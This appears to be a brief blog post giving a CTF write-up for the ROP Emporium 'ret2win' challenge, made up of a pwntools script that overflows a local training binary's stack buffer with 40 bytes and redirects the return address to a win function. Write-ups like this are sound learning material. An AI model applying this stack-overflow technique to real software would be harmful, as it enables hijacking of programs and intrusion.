---
layout: post
title:  "ROP-Emporium Writeup"
date:   2021-03-28 11:59:00 +0900
categories: CTF
---

## ret2win

```
exp：

from pwn import *

sh = process("./ret2win")

x = b'1'*40 + p64(0x400756)

sh.sendline(x)
sh.interactive()
```